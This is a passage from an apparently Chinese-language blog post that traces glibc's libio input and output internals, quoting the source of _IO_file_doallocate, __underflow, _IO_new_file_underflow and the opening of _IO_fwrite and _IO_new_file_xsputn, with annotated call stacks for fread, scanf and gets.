class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>) <span class="comment">// 调用`_IO_SYSSTAT`获取FILE信息</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);<span class="comment">// 调用`_IO_setb`设置FILE缓冲区</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>_IO_file_doallocate</code>函数是分配输入缓冲区的实现函数，首先调用<code>_IO_SYSSTAT</code>去获取文件信息，<code>_IO_SYSSTAT</code>函数是vtable中的<code>__stat</code>函数，获取文件信息，<strong>修改相应需要申请的size。</strong></p><p>空间申请出来后，调用<code>_IO_setb</code>，跟进去看它干了些啥，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数相对比较简单的就是设置了<code>_IO_buf_base</code>和<code>_IO_buf_end</code>，可以预料到<code>_IO_setb</code>函数执行完后，fp的这两个指针被赋上值了</p><p>到此，初始化缓冲区就完成了，函数返回<code>_IO_file_doallocate</code>后，接着<code>_IO_file_doallocate</code>也返回到<code>_IO_file_xsgetn</code>函数中.</p><h2 id="0x2-1"><a href="#0x2-1" class="headerlink" title="0x2"></a>0x2</h2><p><strong>拷贝输入缓冲区数据</strong></p><p>如果输入缓冲区里存在已输入的数据，则把它直接拷贝到目标缓冲区里。</p><p>这部分比较简单，<strong>需要说明下,<code>fp-&gt;_IO_read_base</code>指向的是输入缓冲区的起始地址，<code>fp-&gt;_IO_read_end</code>指向的是输入缓冲区的结束地址。<code>fp-&gt;_IO_read_ptr</code>指向还未读入的数据</strong></p><p>将<code>fp-&gt;_IO_read_end-fp-&gt;_IO_read_ptr</code>之间的数据通过<code>memcpy</code>拷贝到目标缓冲区里。</p><h2 id="0x3-1"><a href="#0x3-1" class="headerlink" title="0x3"></a>0x3</h2><p><strong>执行系统调用读取数据</strong></p><p>在输入缓冲区为0或者是不能满足需求的时候则会执行最后一步<code>__underflow</code>去执行系统调用<code>read</code>读取数据，并放入到输入缓冲区里。</p><p>进入到<code>__underflow</code>，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数稍微做一些检查就会调用<code>_IO_UNDERFLOW</code>函数，其中一个检查是如果<code>fp-&gt;_IO_read_ptr</code>小于<code>fp-&gt;_IO_read_end</code>则表明输入缓冲区里存在数据，可直接返回，否则则表示需要继续读入数据。</p><p>检查都通过的话就会调用<code>_IO_UNDERFLOW</code>函数，该函数是FILE结构体vtable里的<code>_IO_new_file_underflow</code>，跟进去看，文件在<code>/libio/fileops.c</code>里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;<span class="comment">//重置诸多缓存指针</span></span><br><span class="line"><span class="comment">//为什么要重置write指针,因为read和write用的是同一个缓冲区,如果不重置wirte的指针的话,那么调用write显然就会冲突</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//最多读buf大小</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;<span class="comment">//read_end指针拔高,这样退出该函数再次进入上层循环时就能直接从read_ptr指针处获得数据</span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>_IO_new_file_underflow</code>函数，是最终调用系统调用的地方，在最终执行系统调用之前，仍然有一些检查，整个流程为：</p><ol><li>检查FILE结构体的<code>_flag</code>标志位是否包含<code>_IO_NO_READS</code>，如果存在这个标志位则直接返回<code>EOF</code>，其中<code>_IO_NO_READS</code>标志位的定义是<code>#define _IO_NO_READS 4 /* Reading not allowed */</code>。</li><li>如果<code>fp-&gt;_IO_buf_base</code>位null，则调用<code>_IO_doallocbuf</code>分配输入缓冲区。</li><li>接着初始化设置FILE结构体指针，将他们都设置成<code>fp-&gt;_IO_buf_base</code></li><li>调用<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数），该函数最终执行系统调用read，读取文件数据，数据读入到<code>fp-&gt;_IO_buf_base</code>中，读入大小为输入缓冲区的大小<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>。</li><li>设置输入缓冲区已有数据的size，即设置<code>fp-&gt;_IO_read_end</code>为<code>fp-&gt;_IO_read_end += count</code>。</li></ol><p>其中第二步里面的如果<code>fp-&gt;_IO_buf_base</code>位null，则调用<code>_IO_doallocbuf</code>分配输入缓冲区，似乎有点累赘，因为之前已经分配了，这个原因在最后会说明。</p><p>其中第四步的<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数）的源码比较简单，就是执行系统调用函数read去读取文件数据，文件在<code>libio/fileops.c</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_file_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">  : __read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_file_underflow</code>函数执行完毕以后，FILE结构体中各个指针已被赋值，且文件数据已读入，输入缓冲区里已经有数据，</p><p>其中<code>fp-&gt;_IO_read_ptr</code>指向输入缓冲区数据的开始位置，<code>fp-&gt;_IO_read_end</code>指向输入缓冲区数据结束的位置：</p><p>函数执行完后，返回到<code>_IO_file_xsgetn</code>函数中，由于<code>while</code>循环的存在，重新执行第二部分，此时将输入缓冲区拷贝至目标缓冲区，最终返回。</p><p>至此，对于fread的源码分析结束。</p><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p>如果分配buf时出错,则执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>采用不使用缓冲区的方式读取</strong></p><h2 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">_IO_new_file_underflow at fileops.c</span><br><span class="line">__GI__IO_default_uflow at genops.c</span><br><span class="line">_IO_vfscanf_internal at vfscanf.c</span><br><span class="line">__isoc99_scanf at  at isoc99_scanf.c</span><br></pre></td></tr></table></figure><p>栈回溯</p><p>可以看到scanf最终是<strong>调用stdin的vtable中的<code>_IO_new_file_underflow</code>去调用read</strong>的。</p><p>不过它并不是由<code>_IO_file_xsgetn</code>调用的，而是使用vtable中的<code>__uflow</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_uflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_uflow)</span><br></pre></td></tr></table></figure><p><code>__uflow</code>函数首先直接调用_IO_new_file_underflow,因此最终也是<code>_IO_new_file_underflow</code>实现的输入。之后其只返回_IO_read_ptr处的一个字符</p><h2 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">__GI__IO_file_underflow</span><br><span class="line">__GI__IO_default_uflow</span><br><span class="line">gets</span><br></pre></td></tr></table></figure><p>函数调用栈与scanf基本一致：</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>虽然不能说全部的io输入都是通过<code>_IO_new_file_underflow</code>函数最终实现的输入，但是应该也可以说大部分是使用<code>_IO_new_file_underflow</code>函数实现的。</p><p>但是仍然有一个问题，由于<code>__uflow</code>直接就调用了<code>_IO_new_file_underflow</code>函数，那么输入缓冲区是在哪里建立的呢</p><p>为了找到这个问题的答案，在程序进入到fscanf函数后又在<code>malloc</code>函数下了个断点，然后栈回溯：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span></span><br><span class="line">__GI__IO_file_doallocate</span><br><span class="line">__GI__IO_doallocbuf</span><br><span class="line">__GI__IO_file_underflow</span><br><span class="line">__GI__IO_default_uflow</span><br><span class="line">__GI__IO_vfscanf</span><br><span class="line">__isoc99_fscanf</span><br><span class="line">main</span><br><span class="line">__libc_start_main</span><br></pre></td></tr></table></figure><p>原来是在<code>__GI__IO_file_underflow</code>分配的空间，回到上面看该函数的源码，确实有一段判断输入缓冲区如果为空则调用<code>__GI__IO_doallocbuf</code>函数建立输入缓冲区的代码，这就解释了<code>__GI__IO_file_underflow</code>第二步中为啥还会有个输入缓冲区判断的原因了。</p><h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><p>有点复杂,写的乱了点,之后改</p><p>fwrite实际上是_IO_fwrite,位于libio/iofwrite.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>_IO_sputn是一个宏最终调用的是vtable中的_IO_file_xsputn,直接搜是找不到这个函数的定义,因为其实际上已被_IO_new_file_xsputn替代</p><p>_IO_new_file_xsputn位于libio/fileops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. 